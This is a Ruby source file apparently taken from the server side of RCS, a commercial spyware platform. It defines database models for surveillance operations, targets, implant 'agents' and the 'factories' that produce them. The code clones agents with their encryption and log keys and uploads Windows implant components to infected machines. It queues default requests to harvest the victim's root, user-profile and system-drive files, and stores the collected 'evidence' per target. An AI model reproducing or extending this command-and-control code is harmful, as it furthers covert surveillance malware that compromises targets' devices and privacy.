# encoding: utf-8

require 'mongoid'

require_relative '../build'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'

class Item
  extend RCS::Tracer
  include RCS::Crypt
  include Mongoid::Document
  include Mongoid::Timestamps

  # common
  field :name, type: String
  field :desc, type: String
  field :status, type: String
  field :_kind, type: String
  field :path, type: Array

  # operation
  field :contact, type: String

  # factory
  field :ident, type: String
  field :counter, type: Integer
  field :seed, type: String
  field :confkey, type: String
  field :logkey, type: String

  # agent instance (+ factory fields)
  field :instance, type: String
  field :version, type: Integer
  field :type, type: String
  field :platform, type: String
  field :deleted, type: Boolean
  field :uninstalled, type: Boolean
  field :demo, type: Boolean
  field :upgradable, type: Boolean

  field :cs, type: String
  
  scope :operations, where(_kind: 'operation')
  scope :targets, where(_kind: 'target')
  scope :agents, where(_kind: 'agent')
  scope :factories, where(_kind: 'factory')

  has_and_belongs_to_many :groups, :dependent => :nullify, :autosave => true

  embeds_many :filesystem_requests, class_name: "FilesystemRequest"
  embeds_many :download_requests, class_name: "DownloadRequest"
  embeds_many :upgrade_requests, class_name: "UpgradeRequest"
  embeds_many :upload_requests, class_name: "UploadRequest"
  
  embeds_one :stat

  embeds_many :configs, class_name: "Configuration"

  index :name
  index :status
  index :_kind
  index :ident
  index :instance

  store_in :items

  after_destroy :destroy_callback

  before_create :do_checksum
  before_update :do_checksum
  before_save :do_checksum
  
  public

  def self.reset_dashboard
    Item.where(_kind: 'agent').each {|i| i.reset_dashboard}
  end

  def reset_dashboard
    self.stat.dashboard = {}
    self.save
  end

  # performs global recalculation of stats (to be called periodically)
  def self.restat
    begin
      # to make stat converge in one step, first restat targets, then operations
      Item.where(_kind: 'target').each {|i| i.restat}
      Item.where(_kind: 'operation').each {|i| i.restat}
    rescue Exception => e
      trace :fatal, "Cannot restat items: #{e.message}"
    end
  end
  
  def restat
    case self._kind
      when 'operation'
        self.stat.size = 0; self.stat.grid_size = 0; self.stat.evidence = {}
        targets = Item.where(_kind: 'target').also_in(path: [self._id])
        targets.each do |t|
          self.stat.evidence.merge!(t.stat.evidence) {|k,o,n| o+n }
          self.stat.size += t.stat.size
          self.stat.grid_size += t.stat.grid_size
        end
        self.save
      when 'target'
        self.stat.grid_size = 0; self.stat.evidence = {}
        agents = Item.where(_kind: 'agent').also_in(path: [self._id])
        agents.each do |b|
          self.stat.evidence.merge!(b.stat.evidence) {|k,o,n| o+n }
          self.stat.grid_size += b.stat.grid_size
        end
        db = Mongoid.database
        collection = db.collections.select {|c| c.name == Evidence.collection_name(self._id.to_s)}
        unless collection.empty?
          self.stat.size = collection.first.stats()['size'].to_i
          self.save
        end
    end
  end

  def get_parent
    ::Item.find(self.path.last)
  end

  def clone_instance
    return nil if self[:_kind] != 'factory'

    agent = Item.new
    agent._kind = 'agent'
    agent.deleted = false
    agent.ident = self[:ident]
    agent.name = self[:ident] + " (#{self[:counter]})"
    agent.type = self[:type]
    agent.desc = self[:desc]
    agent[:path] = self[:path]
    agent.confkey = self[:confkey]
    agent.logkey = self[:logkey]
    agent.seed = self[:seed]

    # clone the factory's config
    fc = self[:configs].first

    nc = ::Configuration.new
    nc.user = fc['user']
    nc.desc = fc['desc']
    nc.config = fc['config']
    nc.saved = Time.now.getutc.to_i

    agent.configs = [ nc ]

    ns = ::Stat.new
    ns.evidence = {}
    ns.dashboard = {}
    ns.size = 0
    ns.grid_size = 0

    agent.stat = ns

    return agent
  end

  def add_first_time_uploads
    return if self[:_kind] != 'agent'

    if self.platform == 'windows'
      factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
      build = RCS::DB::Build.factory(:windows)
      build.load({'_id' => factory._id})
      build.unpack
      build.patch({'demo' => false})

      # copy the files in the upgrade collection
      add_upgrade('core64', File.join(build.tmpdir, 'core64'))
      add_upgrade('rapi', File.join(build.tmpdir, 'rapi'))
      add_upgrade('codec', File.join(build.tmpdir, 'codec'))
      add_upgrade('sqlite', File.join(build.tmpdir, 'sqlite'))

      build.clean
    end

  end

  def add_upgrade(name, file)
    content = File.binread(file)
    self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name})] })
  end

  def add_default_filesystem_requests
    return if self[:_kind] != 'agent'

    # the request for the root
    self.filesystem_requests.create!({path: '/', depth: 1})

    # the home for the current user
    self.filesystem_requests.create!({path: '%USERPROFILE%', depth: 2})

    # special request for windows to have the c: drive
    self.filesystem_requests.create!({path: '%HOMEDRIVE%\\\\*', depth: 1}) if self.platform == 'windows'
  end

  protected
  
  def destroy_callback
    # remove the item form any dashboard or recent
    ::User.all.each {|u| u.delete_item(self._id)}
    # remove the item form the alerts
    ::Alert.all.each {|a| a.delete_if_item(self._id)}
    # remove the NIA rules that contains the item
    ::Injector.all.each {|p| p.delete_rule_by_item(self._id)}
    
    case self._kind
      when 'operation'
        # destroy all the targets of this operation
        Item.where({_kind: 'target', path: [ self._id ]}).each {|targ| targ.destroy}
      when 'target'
        # destroy all the agents of this target
        Item.where({_kind: 'agent'}).also_in({path: [ self._id ]}).each {|agent| agent.destroy}
        # drop the evidence collection of this target
        Mongoid.database.drop_collection Evidence.collection_name(self._id.to_s)
      when 'agent'
        # destroy all the evidences
        Evidence.collection_class(self.path.last).where(item: self._id).each {|ev| ev.destroy}
        # drop all grid items
        RCS::DB::GridFS.delete_by_agent(self._id.to_s, self.path.last.to_s)
    end
  end

  def do_checksum
    self.cs = calculate_checksum
  end

  public 
  def calculate_checksum
    # take the fields that are relevant and calculate the checksum on it
    hash = [self._id, self.name, self.counter, self.status, self._kind, self.path]

    if self._kind == 'agent'
      hash << [self.instance, self.type, self.platform, self.deleted, self.uninstalled, self.demo, self.upgradable]
    end

    aes_encrypt(Digest::SHA1.digest(hash.inspect), Digest::SHA1.digest("∫∑x=1 ∆t")).unpack('H*').first
  end

end

class FilesystemRequest
  include Mongoid::Document
  
  field :path, type: String
  field :depth, type: Integer
  
  validates_uniqueness_of :path

  embedded_in :item
end

class DownloadRequest
  include Mongoid::Document

  field :path, type: String

  validates_uniqueness_of :path

  embedded_in :item
end

class UpgradeRequest
  include Mongoid::Document
  
  field :filename, type: String
  field :_grid, type: Array

  validates_uniqueness_of :filename

  embedded_in :item
end

class UploadRequest
  include Mongoid::Document
  
  field :filename, type: String
  field :_grid, type: Array
  
  validates_uniqueness_of :filename
  
  embedded_in :item
end

class Stat
  include Mongoid::Document

  field :source, type: String
  field :user, type: String
  field :device, type: String
  field :last_sync, type: Integer
  field :last_sync_status, type: Integer
  field :last_child, type: Array
  field :size, type: Integer, :default => 0
  field :grid_size, type: Integer, :default => 0
  field :evidence, type: Hash, :default => {}
  field :dashboard, type: Hash, :default => {}
  
  embedded_in :item
end
